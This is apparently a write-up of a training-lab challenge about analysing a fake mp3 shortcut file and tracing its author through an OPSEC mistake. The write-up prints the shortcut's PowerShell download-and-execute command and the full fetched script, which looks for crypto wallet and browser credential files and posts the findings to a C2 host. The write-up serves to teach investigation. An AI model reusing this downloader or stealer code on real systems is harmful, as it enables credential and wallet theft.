# Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

## Challenge Objective:
> Learn how to investigate malicious link files.   
> Learn about OPSEC and OPSEC mistakes.   
> Understand how to track and attribute digital identities in cyber investigations.  

## Investigating the Website:
Used the mp3 converter and downloaded the zip file called `download.zip`, Then used `Extract` to open the zip file and found 2 extracted files: `song.mp3` and `somg.mp3`.   
Used the command `file song.mp3` and `file somg.mp3`  
     
**There I found:**
   
```
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-201
```
****Then visiting `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1` I got:****
```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```
Understanding this code got to know that it is a crypto wallet grabber.

Also found out **`Created by the one and only M.M.`** which helped me find out `https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues`, and gave me the profile of **M.M**.
![image](https://github.com/user-attachments/assets/9209dc23-9767-4155-a82a-a5d7fa14829d)    
Then going into the public repositories helped me find 
![image](https://github.com/user-attachments/assets/632fcf20-28a1-4c25-bfc3-785eac78f977)
Using all of this Information I answered these questions:
![image](https://github.com/user-attachments/assets/78a8e1bd-ec1f-4d53-9ffb-925f2842f650)


